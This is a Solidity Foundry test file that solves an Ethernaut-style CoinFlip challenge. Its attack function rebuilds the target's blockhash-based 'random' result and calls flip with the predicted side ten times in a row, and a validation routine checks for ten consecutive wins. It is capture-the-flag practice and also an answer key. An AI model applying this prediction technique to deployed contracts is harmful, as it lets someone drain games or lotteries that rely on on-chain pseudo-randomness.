// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Attack.sol";
import "./CoinFlip.sol";

contract CoinFlipAttack is Attack {
  CoinFlip public _coinFlip;

  function setUp() public {
    vm.prank(owner);
    _coinFlip = new CoinFlip();
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1)); // `block.number` is the same as the one calculated in CoinFlip

    uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool side = coinFlip == 1 ? true : false;

    _coinFlip.flip(side);
  }

  function test_attack() public {
    vm.startPrank(attacker);

    for (uint256 i = 0; i < 10; i++) {
      attack();
      vm.roll(block.number + 1); // Cannot attack twice in a single block
    }

    /*** Validation ***/
    assertFinished(address(_coinFlip));
  }

  function validateInstance(address payable _instance, address) override public view returns (bool) {
    CoinFlip instance = CoinFlip(_instance);
    return instance.consecutiveWins() >= 10;
  }
}
